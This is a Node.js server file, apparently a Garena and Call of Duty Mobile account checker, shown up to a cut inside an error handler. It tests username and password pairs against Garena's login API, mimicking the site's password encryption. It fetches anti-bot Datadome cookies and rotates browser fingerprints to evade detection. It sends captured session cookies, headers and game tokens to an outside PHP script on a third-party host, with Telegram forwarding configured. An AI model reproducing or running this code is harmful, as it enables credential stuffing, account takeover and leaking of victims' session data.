// server.js
require('dotenv').config(); // Load environment variables from .env file
const os = require('os');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const express = require('express');
const axios = require('axios');
const winston = require('winston');
const stripAnsi = require('strip-ansi');
const _ = require('lodash'); // For HTML escaping

// --- Configuration ---
const LOG_DIR = "logs";
const FORWARD_POST_URL = process.env.FORWARD_POST_URL || null;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_ADMIN_USER_ID = process.env.TELEGRAM_ADMIN_USER_ID;
// Default FORWARD_CHAT_ID to admin ID if available, otherwise null
const FORWARD_CHAT_ID = process.env.FORWARD_CHAT_ID || (TELEGRAM_BOT_TOKEN ? TELEGRAM_ADMIN_USER_ID : null);
const PORT = process.env.PORT || 5000;

const APK_URL = "https://auth.garena.com/api/login?"; // Base URL, params added later
const REDIRECT_URL = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/";
const EXTERNAL_SCRIPT_URL = "https://suneoxjarell.x10.bz/jajak.php";
const EXPECTED_OWNER = "t.me/yishux";

const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
];

// In-memory queue for forwarding
const forwardQueue = [];

// --- Logging Setup ---
fs.existsSync(LOG_DIR) || fs.mkdirSync(LOG_DIR);
const logFile = path.join(LOG_DIR, `api_checker_run_${Math.floor(Date.now() / 1000)}.log`);

const logger = winston.createLogger({
    level: 'info', // Set default level
    format: winston.format.combine(
        winston.format.timestamp({ format: 'YYYY-MM-DD HH:mm:ss.SSS' }),
        winston.format.printf(({ timestamp, level, message, ...meta }) => {
            // Simple format similar to the Python one
            let metaString = '';
            if (meta && Object.keys(meta).length > 0) {
                 // Attempt to mimic the Python format slightly if function/line info is passed
                 if (meta.function && meta.line) {
                     metaString = ` [${meta.function}:${meta.line}]`;
                 } else {
                     // Fallback for general metadata
                     // metaString = ` ${JSON.stringify(meta)}`; // Avoid stringifying large objects
                 }
            }
            // Use default node process/thread info if available
            const threadInfo = `[pid:${process.pid}]`; // Node doesn't have Python's threadName easily accessible here

            return `${timestamp} - ${level.toUpperCase()} - ${threadInfo}${metaString} - ${message}`;
        })
    ),
    transports: [
        new winston.transports.File({ filename: logFile, level: 'debug', options: { flags: 'a' }, encoding: 'utf8' }),
        new winston.transports.Console({ level: 'info' }) // Console logs at info level
    ],
    // Do not exit on handled exceptions
    // exitOnError: false, // Default is true, might want false for long-running server
});

// Silence axios/other library debug logs if needed (less direct than Python's approach)
// You might need more specific filtering if other libraries are too noisy at 'debug' level.

// --- Utility Functions ---

function stripAnsiCodes(text) {
    if (typeof text !== 'string') {
        return text;
    }
    try {
        return stripAnsi(text);
    } catch (e) {
        // Fallback regex might be less robust than the dedicated library
        return text.replace(/\x1B\[[0-?]*[ -/]*[@-~]/g, '').replace(/\x1B\[[0-?]*m/g, '');
    }
}

function getCurrentTimestamp() {
    return String(Math.floor(Date.now() / 1000));
}

function generateMd5Hash(password) {
    return crypto.createHash('md5').update(password, 'utf-8').digest('hex');
}

function generateDecryptionKey(passwordMd5, v1, v2) {
    const intermediateHash = crypto.createHash('sha256').update(passwordMd5 + v1).digest('hex');
    return crypto.createHash('sha256').update(intermediateHash + v2).digest('hex');
}

function encryptAes256Ecb(plaintextHex, keyHex) {
    try {
        const keyBytes = Buffer.from(keyHex, 'hex');
        if (keyBytes.length !== 32) {
            throw new Error(`AES key must be 32 bytes (256 bits), got ${keyBytes.length}`);
        }
        // For ECB mode in Node's crypto, the IV is ignored or should be null/empty buffer
        const cipher = crypto.createCipheriv('aes-256-ecb', keyBytes, null);
        cipher.setAutoPadding(false); // Disable auto-padding to replicate Python's manual padding

        const plaintextBytes = Buffer.from(plaintextHex, 'hex');
        const blockSize = 16;
        const paddingLength = blockSize - (plaintextBytes.length % blockSize);
        const paddingBuffer = Buffer.alloc(paddingLength, paddingLength); // Create buffer filled with paddingLength value
        const paddedPlaintext = Buffer.concat([plaintextBytes, paddingBuffer]);

        let encrypted = cipher.update(paddedPlaintext, null, 'hex'); // Input is buffer, output hex
        encrypted += cipher.final('hex');

        return encrypted.substring(0, 32); // Match Python's slicing
    } catch (error) {
        logger.error(`AES Encryption Error: ${error.message}. PlaintextHex: ${plaintextHex.substring(0, 10)}..., KeyHex: ${keyHex.substring(0, 10)}...`);
        throw error; // Re-throw after logging
    }
}


function getEncryptedPassword(password, v1, v2) {
    const passwordMd5 = generateMd5Hash(password);
    const decryptionKey = generateDecryptionKey(passwordMd5, v1, v2);
    return encryptAes256Ecb(passwordMd5, decryptionKey);
}

function getRandomUserAgentData() {
    const ua = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
    let secChUa = "";
    let platformName = "Windows"; // Default

    if (ua.includes("Chrome/")) {
        const match = ua.match(/Chrome\/(\d+)/);
        const version = match ? match[1] : "120"; // Fallback version
        secChUa = `"Google Chrome";v="${version}", "Not)A;Brand";v="8", "Chromium";v="${version}"`;
    }
    if (ua.includes("Macintosh") || ua.includes("Mac OS X")) {
        platformName = "macOS";
    }
     // Firefox, Safari etc. don't typically send sec-ch-ua in the same way by default

    return { userAgent: ua, secChUa, platformName };
}

function detectCaptchaInResponse(responseText) {
    return typeof responseText === 'string' && responseText.toLowerCase().includes("captcha");
}

// --- Cookie Parsing Helper ---
// Basic cookie parser from Set-Cookie headers
function parseCookies(setCookieHeaders) {
    const cookies = {};
    if (!setCookieHeaders) return cookies;
    const headers = Array.isArray(setCookieHeaders) ? setCookieHeaders : [setCookieHeaders];
    headers.forEach(header => {
        const parts = header.split(';');
        if (parts.length > 0) {
            const cookiePair = parts[0].split('=');
            if (cookiePair.length === 2) {
                const key = cookiePair[0].trim();
                const value = cookiePair[1].trim();
                if (key && value) { // Ensure key and value are not empty
                     cookies[key] = value;
                }
            }
        }
    });
    return cookies;
}

// Format cookies object into a string for the 'Cookie' header
function formatCookiesForHeader(cookies) {
    return Object.entries(cookies)
        .map(([key, value]) => `${key}=${value}`)
        .join('; ');
}


// --- Core Logic Functions ---

async function getRequestData() {
    // Cookies are managed per request flow, start empty here
    const finalCookies = {};
    const { userAgent, secChUa, platformName } = getRandomUserAgentData();
    logger.debug(`Using UA: ${userAgent}, Platform: ${platformName}`);

    const headers = {
        'Host': 'auth.garena.com',
        'Connection': 'keep-alive',
        // Only add sec-ch-ua headers if they exist (Chrome/Edge)
        ...(secChUa && { 'sec-ch-ua': secChUa }),
        'sec-ch-ua-mobile': '?0',
        'User-Agent': userAgent,
        ...(platformName && { 'sec-ch-ua-platform': `"${platformName}"` }),
        'Accept': 'application/json, text/plain, */*',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': `https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=${encodeURIComponent(REDIRECT_URL)}`,
        'Accept-Encoding': 'gzip, deflate, br, zstd', // Axios handles this automatically
        'Accept-Language': 'en-US,en;q=0.9'
    };
    return { finalCookies, headers };
}

async function getDatadomeCookie(proxies = null) { // Note: proxies not implemented in axios setup here
    const url = 'https://dd.garena.com/js/';
    const { userAgent, secChUa, platformName } = getRandomUserAgentData();
    const headers = {
        'accept': '*/*',
        // 'accept-encoding': 'gzip, deflate, br, zstd', // Axios handles this
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        ...(secChUa && { 'sec-ch-ua': secChUa }),
        'sec-ch-ua-mobile': '?0',
        ...(platformName && { 'sec-ch-ua-platform': `"${platformName}"` }),
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': userAgent
    };

    const payload = {
        'jsData': JSON.stringify({"ttst": _.random(50, 150), "br_oh":1080, "br_ow":1920}),
        'eventCounters': '[]',
        'jsType': 'ch',
        'ddv': '4.35.4',
        'Referer': 'https://account.garena.com/',
        'request': '%2F', // Encoded '/'
        'responsePage': 'origin',
    };
    // Use URLSearchParams for proper encoding of form data
    const data = new URLSearchParams(payload).toString();
    // const data = Object.entries(payload).map(([k, v]) => `${k}=${encodeURIComponent(String(v))}`).join('&'); // Manual alternative

    try {
        const response = await axios.post(url, data, {
            headers: headers,
            timeout: 15000, // 15 seconds
             // proxy: proxies ? { host: proxyHost, port: proxyPort } : false // Basic proxy setup if needed
            validateStatus: status => status >= 200 && status < 500 // Allow 4xx errors for inspection
        });

        const responseTextClean = stripAnsiCodes(response.data ? JSON.stringify(response.data) : ''); // Axios usually parses JSON

        if (detectCaptchaInResponse(responseTextClean)) {
            logger.warn(`CAPTCHA detected in Datadome response body: ${responseTextClean.substring(0, 200)}`);
            return "[API_ERROR] CAPTCHA Detected (Datadome Response Body)";
        }
         if (response.status >= 400) {
            logger.warn(`Datadome request failed with status ${response.status}: ${responseTextClean.substring(0, 200)}`);
             // Check for captcha again in error response
            if (detectCaptchaInResponse(responseTextClean)) {
                 return "[API_ERROR] CAPTCHA Detected (Datadome HTTP Error)";
            }
             return `[API_ERROR] Datadome Request Failed (${response.status})`;
        }


        const responseJson = response.data; // Already parsed by axios

        if (typeof responseJson !== 'object' || responseJson === null) {
             logger.warn(`Datadome response was not valid JSON: ${responseTextClean.substring(0, 200)}`);
             return "[API_ERROR] Datadome Invalid JSON";
        }

        // Check JSON content for captcha hints
        if (detectCaptchaInResponse(JSON.stringify(responseJson))) {
            logger.warn(`CAPTCHA detected in Datadome JSON response: ${JSON.stringify(responseJson).substring(0, 200)}`);
            return "[API_ERROR] CAPTCHA Detected (Datadome JSON)";
        }


        if (responseJson.cookie) {
            const cookieString = responseJson.cookie;
            const match = cookieString.match(/datadome=([^;]+)/);
            if (match && match[1]) {
                logger.debug("Successfully fetched Datadome cookie.");
                return match[1];
            }
        }

        logger.warn(`Datadome response missing expected cookie: ${JSON.stringify(responseJson).substring(0, 200)}`);
        return null; // Indicate missing cookie, but not necessarily a hard error yet

    } catch (error) {
        const errorStr = stripAnsiCodes(error.toString());
        const respText = error.response ? stripAnsiCodes(JSON.stringify(error.response.data)) : "";
        const status = error.response ? error.response.status : "N/A";

        if (detectCaptchaInResponse(errorStr) || detectCaptchaInResponse(respText)) {
            logger.warn(`CAPTCHA detected during Datadome request/parse error: ${errorStr} / ${respText.substring(0, 100)}`);
            return "[API_ERROR] CAPTCHA Detected (Datadome Request/Parse Error)";
        }
         if (error.code === 'ECONNABORTED' || error.message.includes('timeout')) {
            logger.error(`Datadome request timed out: ${errorStr}`);
            return "[API_ERROR][Timeout] Datadome Request Timeout";
        }
        logger.error(`Failed to get Datadome cookie: ${errorStr} (Status: ${status}) Response: ${respText.substring(0,150)}`);
        return `[API_ERROR] Datadome Request Error: ${errorStr.substring(0, 100)}`;
    }
}

async function show_level(accessToken, selectedHeader, cookiesForCodm, proxies = null) {
    const callbackBaseUrl = "https://auth.codm.garena.com/auth/auth/callback_n";
    const callbackParams = { site: "https://api-delete-request.codm.garena.co.id/oauth/callback/", access_token: accessToken };

    const baseHeaders = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", // More standard browser accept
        // "Accept-Encoding": "gzip, deflate, br", // Axios handles
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://auth.garena.com/",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-site", // Changed from same-origin based on redirect context
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": selectedHeader['User-Agent'] || "Mozilla/5.0", // Use provided UA
    };
    // Add sec-ch-ua headers if present in selectedHeader
    Object.keys(selectedHeader).forEach(key => {
        if (key.toLowerCase().startsWith('sec-ch-ua')) {
            baseHeaders[key] = selectedHeader[key];
        }
    });

    let currentCookies = { ...cookiesForCodm }; // Start with passed cookies
    let extractedToken = null;
    let currentUrl = callbackBaseUrl;
    let currentParams = new URLSearchParams(callbackParams).toString(); // Start with params
    let redirectCount = 0;
    const maxRedirects = 7;

    try {
        while (redirectCount < maxRedirects) {
            const requestUrl = currentParams ? `${currentUrl}?${currentParams}` : currentUrl;
            logger.debug(`CODM Callback Request ${redirectCount + 1}: URL=${requestUrl.substring(0, 100)}`);

            const response = await axios.get(requestUrl, {
                headers: {
                    ...baseHeaders, // Include base headers
                    'Cookie': formatCookiesForHeader(currentCookies) // Send current cookies
                },
                timeout: 30000, // 30 seconds
                maxRedirects: 0, // Handle redirects manually
                validateStatus: status => status >= 200 && status < 400, // Allow 3xx redirects
                 // proxy: proxies ? { host: proxyHost, port: proxyPort } : false
            });

            const responseTextClean = stripAnsiCodes(typeof response.data === 'string' ? response.data : JSON.stringify(response.data));
            const newCookies = parseCookies(response.headers['set-cookie']);
            currentCookies = { ...currentCookies, ...newCookies }; // Merge cookies

            logger.debug(`CODM Callback Response ${redirectCount + 1}: Status=${response.status}, Size=${responseTextClean.length}, Cookies updated: ${Object.keys(newCookies).join(', ')}`);


            if (detectCaptchaInResponse(responseTextClean)) {
                logger.warn(`CAPTCHA detected in CODM callback body (URL: ${currentUrl.substring(0, 100)}...)`);
                return "[API_ERROR] CAPTCHA Detected (CODM Callback/Redirect Body)";
            }
             // Note: We set validateStatus, so 4xx/5xx errors land in the catch block

            if (response.status >= 300 && response.status < 400) { // Handle Redirects (301, 302, 307, 308)
                const redirectUrl = response.headers['location'];
                if (!redirectUrl) {
                    logger.error("CODM Redirect detected but no Location header.");
                    return "[CODM_FAIL] Redirect detected but no Location header.";
                }
                // Resolve relative URLs correctly
                const previousUrlObj = new URL(currentUrl);
                const nextUrlObj = new URL(redirectUrl, previousUrlObj.origin + previousUrlObj.pathname); // Use base for relative paths
                currentUrl = nextUrlObj.toString();
                currentParams = null; // Params are usually lost on redirect unless explicitly in the Location URL
                redirectCount++;
                logger.debug(`Following redirect ${redirectCount} to: ${currentUrl.substring(0, 100)}...`);
                await new Promise(resolve => setTimeout(resolve, 200)); // Small delay
            } else { // Should be a 2xx response now
                 logger.debug(`CODM Callback landed on: ${response.config.url.substring(0, 100)}...`); // Log the final URL requested
                 const finalUrl = response.request.res.responseUrl || response.config.url; // Try to get the final URL after internal handling if any

                 // Try extracting token from URL query params first
                 try {
                    const finalUrlObj = new URL(finalUrl);
                    extractedToken = finalUrlObj.searchParams.get("token");
                 } catch (urlParseError) {
                    logger.warn(`Could not parse final URL: ${finalUrl} - ${urlParseError.message}`)
                 }


                 // If not in URL, try regex on body
                 if (!extractedToken) {
                     const tokenMatch = responseTextClean.match(/["']token["']\s*:\s*["']([\w\-.]+)["']/);
                     if (tokenMatch && tokenMatch[1]) {
                         extractedToken = tokenMatch[1];
                     }
                 }

                if (!extractedToken) {
                    logger.warn(`CODM Token Extraction Failed. Final URL: ${finalUrl}, Status: ${response.status}, Body Snippet: ${responseTextClean.substring(0, 200)}`);
                    return "[CODM_FAIL] Could not extract CODM token from callback.";
                }
                logger.debug(`Extracted CODM token: ${extractedToken.substring(0, 10)}...`);
                break; // Token found, exit loop
            }
        } // End while loop

        if (redirectCount >= maxRedirects) {
            logger.error("Maximum redirects reached during CODM callback.");
            return "[CODM_FAIL] Maximum redirects reached during CODM callback.";
        }

        // --- Call External CODM Script ---
        const payloadForScript = {
            "user_agent": selectedHeader['User-Agent'],
            "extracted_token": extractedToken
        };
        const scriptHeaders = {
            "Content-Type": "application/json",
            "User-Agent": selectedHeader['User-Agent']
        };

        try {
            logger.debug(`Calling external CODM script: ${EXTERNAL_SCRIPT_URL} with token ${extractedToken.substring(0, 10)}...`);
            const responseCodm = await axios.post(EXTERNAL_SCRIPT_URL, payloadForScript, {
                headers: scriptHeaders,
                timeout: 45000, // 45 seconds
                // proxy: proxies ? { host: proxyHost, port: proxyPort } : false,
                // Transform response to ensure it's a string for consistent handling
                 transformResponse: [(data) => {
                     // If it's already a string, keep it. If object/buffer, stringify.
                     if (typeof data === 'string') return data;
                     try { return JSON.stringify(data); } catch { return String(data); }
                 }],
                 validateStatus: status => status >= 200 && status < 500 // Allow 4xx
            });

            const responseCodmTextClean = stripAnsi(responseCodm.data.trim()); // data should be string due to transformResponse
            logger.debug(`External CODM script response (cleaned): ${responseCodmTextClean.substring(0, 200)}`);

            if (detectCaptchaInResponse(responseCodmTextClean)) {
                logger.warn("CAPTCHA detected in external CODM script response.");
                return "[API_ERROR] CAPTCHA Detected (CODM External Script Response)";
            }
             if (responseCodm.status >= 400) {
                logger.warn(`External CODM script returned HTTP error ${responseCodm.status}: ${responseCodmTextClean.substring(0, 150)}`);
                // Optionally check for captcha again in error response
                 if (detectCaptchaInResponse(responseCodmTextClean)) {
                    return "[API_ERROR] CAPTCHA Detected (CODM External Script HTTP Error)";
                }
                return `[CODM_FAIL] Script HTTP error ${responseCodm.status}: ${responseCodmTextClean.substring(0, 100)}`;
            }

            // Check response format
            if (responseCodmTextClean.includes("|") && responseCodmTextClean.split("|").length === 4) {
                const parts = responseCodmTextClean.split("|");
                // Check if level part is numeric and other parts are non-empty/not 'N/A'
                const levelPart = parts[1] ? parts[1].trim() : "";
                const isValidLevel = /^\d+$/.test(levelPart); // Check if it's digits only
                const areOtherPartsValid = parts.every(p => p && p.trim() !== "N/A");

                if (isValidLevel && areOtherPartsValid) {
                    logger.info(`CODM script success: ${responseCodmTextClean}`);
                    return responseCodmTextClean; // Return the successful string
                } else {
                    logger.warn(`CODM script returned parsable but invalid data: ${responseCodmTextClean}`);
                    return `[CODM_WARN] Script data invalid: ${responseCodmTextClean.substring(0, 100)}`;
                }
            } else {
                // Handle specific error messages from the script
                 const lowerCaseResponse = responseCodmTextClean.toLowerCase();
                if (lowerCaseResponse.includes("not found") || lowerCaseResponse.includes("invalid token")) {
                    logger.warn(`CODM script indicated account not linked or invalid token: ${responseCodmTextClean}`);
                    return `[CODM_FAIL] Account likely not linked or token invalid.`;
                } else if (lowerCaseResponse.includes("error") || lowerCaseResponse.includes("fail")) {
                     logger.warn(`CODM script returned error: ${responseCodmTextClean}`);
                     return `[CODM_FAIL] Script error: ${responseCodmTextClean.substring(0, 150)}`;
                } else {
                     logger.warn(`CODM script returned unexpected format: ${responseCodmTextClean}`);
                     return `[CODM_WARN] Script unexpected format: ${responseCodmTextClean.substring(0, 100)}`;
                }
            }

        } catch (scriptError) {
             const errorStr = stripAnsiCodes(scriptError.toString());
             const respText = scriptError.response ? stripAnsiCodes(String(scriptError.response.data)) : ""; // data might not be json
             const status = scriptError.response ? scriptError.response.status : "N/A";

             if (detectCaptchaInResponse(errorStr) || detectCaptchaInResponse(respText)) {
                logger.warn(`CAPTCHA detected during external CODM script request error: ${errorStr}`);
                return "[API_ERROR] CAPTCHA Detected (CODM External Script Request Error)";
            }
             if (scriptError.code === 'ECONNABORTED' || scriptError.message.includes('timeout')) {
                 logger.error("CODM check script request timed out.");
                return "[API_ERROR][Timeout] CODM check script request timed out.";
             }
            logger.error(`Error contacting CODM check script: ${errorStr} (Status: ${status}) Response: ${respText.substring(0,100)}`);
            return `[CODM_FAIL] Error contacting check script: ${errorStr.substring(0, 100)}`;
        }

    } catch (callbackError) {
        // Handle errors from the callback/redirect loop
        const errorStr = stripAnsiCodes(callbackError.toString());
        const respText = callbackError.response ? stripAnsiCodes(String(callbackError.response.data)) : ""; // Data might be HTML
        const status = callbackError.response ? callbackError.response.status : "N/A";
         const errorDetail = `${errorStr.substring(0, 100)}` + (status !== 'N/A' ? ` (Status: ${status})` : "");

        if (detectCaptchaInResponse(errorStr) || detectCaptchaInResponse(respText)) {
            logger.warn(`CAPTCHA detected during CODM callback request error: ${errorStr}`);
            return "[API_ERROR] CAPTCHA Detected (CODM Callback Request Error)";
        }
         if (callbackError.code === 'ECONNABORTED' || callbackError.message.includes('timeout')) {
             logger.error("CODM callback request timed out.");
            return "[API_ERROR][Timeout] CODM callback request timed out.";
        }
         logger.warn(`CODM Callback Request Error: ${errorStr} Response: ${respText.substring(0,100)}`);
         return `[CODM_FAIL] Callback request error: ${errorDetail}`;
    }
}


async function checkLogin(accountUsername, _id, encryptedPassword, password, selectedHeader, initialCookies, datadomeFromPrelogin, date, proxies = null) {
    let currentCookies = { ...initialCookies }; // Copy initial cookies
    logger.debug(`Starting check_login for ${accountUsername}`);

    if (datadomeFromPrelogin) {
        logger.debug("Using Datadome cookie from prelogin.");
        currentCookies["datadome"] = datadomeFromPrelogin;
    } else {
        logger.debug("No Datadome from prelogin, attempting manual fetch.");
        const manualDatadomeResult = await getDatadomeCookie(proxies);
        if (typeof manualDatadomeResult === 'string' && manualDatadomeResult.startsWith("[")) { // Error string format
            logger.warn(`Manual Datadome fetch failed for ${accountUsername}: ${manualDatadomeResult}`);
            return manualDatadomeResult; // Return the error string
        } else if (manualDatadomeResult) { // Successfully fetched string
            logger.debug("Successfully fetched Datadome manually.");
            currentCookies["datadome"] = manualDatadomeResult;
        } else {
            // Could be null or empty if fetch didn't error but didn't find cookie
            logger.warn(`Manual Datadome fetch returned no cookie for ${accountUsername}. Proceeding without.`);
        }
    }

    const loginParams = {
        'app_id': '100082',
        'account': accountUsername,
        'password': encryptedPassword,
        'redirect_uri': REDIRECT_URL,
        'format': 'json',
        'id': _id,
    };
    const loginUrl = `${APK_URL}${new URLSearchParams(loginParams).toString()}`;
    logger.debug(`Attempting Garena login: ${loginUrl}`);

    let loginResponse;
    try {
        loginResponse = await axios.get(loginUrl, {
            headers: {
                ...selectedHeader, // Use headers from getRequestData
                'Cookie': formatCookiesForHeader(currentCookies) // Send current cookies
            },
            timeout: 30000, // 30 seconds
            // proxy: proxies ? { host: proxyHost, port: proxyPort } : false,
            validateStatus: status => status >= 200 && status < 500 // Handle 4xx/5xx manually
        });

        // Need to handle potential non-JSON responses carefully
        let responseTextClean = '';
        if (typeof loginResponse.data === 'string') {
             responseTextClean = stripAnsiCodes(loginResponse.data);
        } else if (typeof loginResponse.data === 'object' && loginResponse.data !== null) {
            try {
                 responseTextClean = stripAnsiCodes(JSON.stringify(loginResponse.data));
            } catch {
                responseTextClean = '[Could not stringify response object]';
            }
        } else {
             responseTextClean = '[Unexpected response data type]';
        }


        logger.debug(`Login response status: ${loginResponse.status}, text snippet: ${responseTextClean.substring(0, 200)}`);

        if (detectCaptchaInResponse(responseTextClean) || (loginResponse.status >= 400 && detectCaptchaInResponse(responseTextClean))) {
            logger.warn(`CAPTCHA detected in login response for ${accountUsername}.`);
            return "[API_ERROR] CAPTCHA Detected (Login Response)";
        }

        // Handle HTTP errors after CAPTCHA check
         if (loginResponse.status === 403) {
            logger.warn(`Login forbidden (403) for ${accountUsername}: ${responseTextClean.substring(0, 100)}`);
            return "[LOGIN_FAIL] Login Forbidden (403)";
         }
         if (loginResponse.status === 429) {
             logger.warn(`Login rate limited (429) for ${accountUsername}`);
             return "[API_ERROR][RateLimit] Rate Limited (429)";
         }
         if (loginResponse.status >= 400) { // Other 4xx/5xx errors
             logger.warn(`Login HTTP Error ${loginResponse.status} for ${accountUsername}: ${responseTextClean.substring(0, 200)}`);
             return `[API_ERROR][HTTP] Login HTTP Error ${loginResponse.status}`;
         }

    } catch (error) {
        const errorStr = stripAnsiCodes(error.toString());
        const status = error.response ? error.response.status : "N/A";

         if (detectCaptchaInResponse(errorStr) || (error.response && detectCaptchaInResponse(String(error.response.data)))) {
            logger.warn(`CAPTCHA potentially detected during login request error for ${accountUsername}: ${errorStr}`);
            return "[API_ERROR] CAPTCHA Detected (Login Request Error)";
        }
         if (error.code === 'ECONNREFUSED') {
            logger.error(`Login connection error for ${accountUsername}: ${errorStr}`);
            return "[API_ERROR][Connection] Server refused connection";
         }
         if (error.code === 'ECONNABORTED' || error.message.includes('timeout')) {
            logger.error(`Login timed out for ${accountUsername}`);
            return "[API_ERROR][Timeout] Login Timeout";
         }
        // Handle other request errors (DNS, network, etc.)
        logger.error(`Login request failed for ${accountUsername}: ${errorStr} (Status: ${status})`);
        return `[API_ERROR][Request] Login Request Failed: ${errorStr.substring(0, 100)}`;
    }

    // --- Process Successful Login Response ---
    let loginJson;
    try {
        // Axios might have already parsed it if Content-Type was correct
        loginJson = (typeof loginResponse.data === 'object' && loginResponse.data !== null)
                    ? loginResponse.data
                    : JSON.parse(loginResponse.data); // Attempt parse if it was a string
         logger.debug(`Login JSON response for ${accountUsername}: ${JSON.stringify(loginJson).substring(0, 300)}`);
    } catch (e) {
        const responseTextClean = stripAnsiCodes(String(loginResponse.data));
        logger.error(`Invalid Login JSON for ${accountUsername}: ${responseTextClean.substring(0, 200)}`);
        return `[API_ERROR] Invalid Login JSON Response`;
    }

    // Update cookies from the successful login response
    const loginCookies = parseCookies(loginResponse.headers['set-cookie']);
    currentCookies = { ...currentCookies, ...loginCookies }; // Merge new cookies


    if (loginJson.error) {
        const errorMsg = loginJson.error;
        logger.warn(`Login error field for ${accountUsername}: ${errorMsg}`);
        if (detectCaptchaInResponse(errorMsg)) {
            return "[API_ERROR] CAPTCHA Required (Login Error Field)";
        }
        if (errorMsg.includes("error_password")) return "[LOGIN_FAIL] Incorrect password";
        if (errorMsg.includes("error_account_does_not_exist")) return "[LOGIN_FAIL] Account doesn't exist";
        if (errorMsg.includes("error_account_not_activated")) return "[LOGIN_FAIL] Account not activated";
        // Add more specific error mappings if known
        return `[LOGIN_FAIL] Login Error: ${errorMsg}`;
    }

    if (!loginJson.session_key) {
        logger.error(`Login response missing session_key for ${accountUsername}: ${JSON.stringify(loginJson)}`);
        return "[API_ERROR] Login Failed: No session key received";
    }

    const sessionKey = loginJson.session_key;
    logger.info(`Garena Login successful for ${accountUsername}. Session Key obtained.`);


    // --- Fetch Account Info via External Script ---
    const accInfoHeaders = { // Mimic Python's 'hider' dict more closely
        'Host': 'account.garena.com',
        'Connection': 'keep-alive',
        'User-Agent': selectedHeader['User-Agent'] || "Mozilla/5.0",
        'Accept': 'application/json, text/plain, */*', // As per Python code
        'Referer': `https://account.garena.com/?session_key=${sessionKey}`,
        'Accept-Language': 'en-US,en;q=0.9',
    };
    // Add sec-ch-ua headers if present in selectedHeader
    Object.keys(selectedHeader).forEach(key => {
        if (key.toLowerCase().startsWith('sec-ch-ua')) {
            accInfoHeaders[key] = selectedHeader[key];
        }
    });

    // Prepare params including cookies and headers for the script
    const scriptParams = {};
    for (const [key, value] of Object.entries(currentCookies)) {
        if (value) scriptParams[`coke_${key}`] = value; // Send non-empty cookies
    }
    for (const [key, value] of Object.entries(accInfoHeaders)) {
         const safeKey = key.replace(/-/g, '_').toLowerCase(); // Convert header names
        if (value) scriptParams[`hider_${safeKey}`] = value; // Send non-empty headers
    }

    let initJsonResponse = null;
    logger.debug(`Fetching account info from external script: ${EXTERNAL_SCRIPT_URL}`);
    try {
        const initResponse = await axios.get(EXTERNAL_SCRIPT_URL, {
            params: scriptParams, // Send data as query parameters
            timeout: 60000, // 60 seconds
            // proxy: proxies ? { host: proxyHost, port: proxyPort } : false,
             transformResponse: [(data) => { // Ensure we get a string back
                 if (typeof data === 'string') return data;
                 try { return JSON.stringify(data); } catch { return String(data); }
             }],
            validateStatus: status => status >= 200 && status < 500 // Allow 4xx
        });

        const initTextClean = stripAnsiCodes(initResponse.data); // Should be a string
        logger.debug(`Acc Info script response status: ${initResponse.status}, text snippet: ${initTextClean.substring(0, 200)}`);

        if (detectCaptchaInResponse(initTextClean)) {
            logger.warn(`CAPTCHA detected in acc info script response for ${accountUsername}.`);
            return "[API_ERROR] CAPTCHA Detected (Acc Info Script Response)";
        }
         if (initResponse.status >= 400) {
            logger.warn(`Acc Info script returned HTTP error ${initResponse.status} for ${accountUsername}: ${initTextClean.substring(0, 150)}`);
            if (detectCaptchaInResponse(initTextClean)) {
                return "[API_ERROR] CAPTCHA Detected (Acc Info Script HTTP Error)";
            }
            return `[API_ERROR] Acc Info script HTTP error ${initResponse.status}`;
        }

        // Attempt to parse the response as JSON
        try {
            initJsonResponse = JSON.parse(initTextClean);
        } catch (jsonError) {
            // Fallback: Try regex to find JSON within the text (less reliable)
             const jsonMatch = initTextClean.match(/({.*?})/s); // Use 's' flag for dotall
             if (jsonMatch && jsonMatch[1]) {
                 try {
                     initJsonResponse = JSON.parse(jsonMatch[1]);
                     logger.debug("Parsed JSON found within Acc Info script text response.");
                 } catch (nestedJsonError) {
                     logger.error(`Failed parsing JSON found within acc info script response for ${accountUsername}: ${jsonMatch[1].substring(0, 200)}`);
                     return `[API_ERROR] Failed to parse account info response (Invalid JSON within text)`;
                 }
             } else {
                 logger.error(`Failed parsing acc info (Not JSON or no JSON found) for ${accountUsername}: ${initTextClean.substring(0, 200)}`);
                 return `[API_ERROR] Failed to parse account info response (Not valid JSON)`;
             }
        }

         logger.debug(`Acc Info JSON response for ${accountUsername}: ${JSON.stringify(initJsonResponse).substring(0, 300)}`);

    } catch (error) {
        const errorStr = stripAnsiCodes(error.toString());
         const respText = error.response ? stripAnsiCodes(String(error.response.data)) : "";
